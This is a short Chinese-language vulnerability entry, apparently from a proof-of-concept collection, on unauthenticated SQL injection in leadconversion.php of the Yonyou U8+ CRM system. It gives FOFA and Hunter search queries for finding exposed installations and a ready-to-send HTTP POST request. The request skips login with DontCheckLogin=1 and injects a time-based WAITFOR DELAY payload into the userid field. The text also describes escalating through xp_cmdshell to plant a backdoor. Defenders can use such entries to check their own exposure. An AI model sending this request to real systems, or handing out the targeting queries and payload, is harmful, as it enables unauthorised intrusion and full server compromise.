# 用友U8+CRM系统leadconversion.php存在SQL注入漏洞

用友U8+CRM系统leadconversion.php存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

## fofa

```javascript
title="用友U8CRM"
```

## hunter

```javascript
app.name="用友 CRM"
```

## poc

```javascript
POST /lead/leadconversion.php HTTP/1.1
Upgrade-Insecure-Requests: 1
Cookie: PHPSESSID=bgsesstimeout-;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 75

DontCheckLogin=1&Action=getDeptName&userid=1%27;WAITFOR+DELAY+%270:0:5%27--
```

